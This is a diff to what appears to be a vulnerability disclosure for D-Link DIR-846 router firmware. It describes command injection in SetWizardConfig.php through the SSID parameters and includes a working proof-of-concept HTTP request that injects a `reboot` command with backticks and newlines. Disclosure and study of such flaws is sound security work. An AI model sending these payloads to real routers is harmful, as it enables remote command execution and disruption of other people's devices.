@@ -48,4 +48,39 @@ DIR846enFW100A53DLA-Retail.bin link https://la.dlink.com/la/ftp_download.php?arc
 ​	The following data packets will cause the router to restart	<img src="./img/image-20211226102955168.png" alt="image-20211226102955168" style="zoom:50%;" />
 
 ## Vulnerability2
+#### Describe
 
+​	HNAP1/control/SetWizardConfig.php in the latest version of D-Link Router DIR-846 DIR846A1_FW100A43.bin && DIR846enFW100A53DLA-Retail.bin  represents an injection vulnerability. Attackers can use this vulnerability to use "\n" or backticks in the shell metacharacters in the ssid0 or ssid1 parameters to cause arbitrary command execution.
+
+#### Detail
+
+​	Since the CVE-2019-17510 vulnerability has not been patched and perfected /squashfs-root/www/HNAP1/control/ SetWizardConfig.php, you can also use \n and single quotes to bypass
+
+<img src="./img/image-20211226104615847.png" alt="image-20211226104615847" style="zoom:50%;" />
+
+#### POC
+
+```
+POST /HNAP1/ HTTP/1.1
+Host: 192.168.0.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+SOAPACTION: "http://purenetworks.com/HNAP1/SetNetworkTomographySettings"
+HNAP_AUTH: AB26D09C30FC07AF9FA05EF59B3B2558 1640421298429
+Content-Length: 76
+Origin: http://192.168.0.1
+Connection: close
+Referer: http://192.168.0.1/Diagnosis.html?t=1640421281425
+Cookie: uid=fN5PwZCT; PrivateKey=B2488589E39C47E4F8349060E88008DE; PHPSESSID=6209b08bddf630e68695800cd08e4203; sys_domain=dlinkrouter.com; timeout=2
+
+{"SetWizardConfig":{"wl(1).(0)_ssid":"`reboot`","wl(0).(0)_ssid":"aa\nreboot\n"}}
+```
+
+
+
+#### TEXT
+
+<img src="./img/image-20211226105603738.png" alt="image-20211226105603738" style="zoom:50%;" />
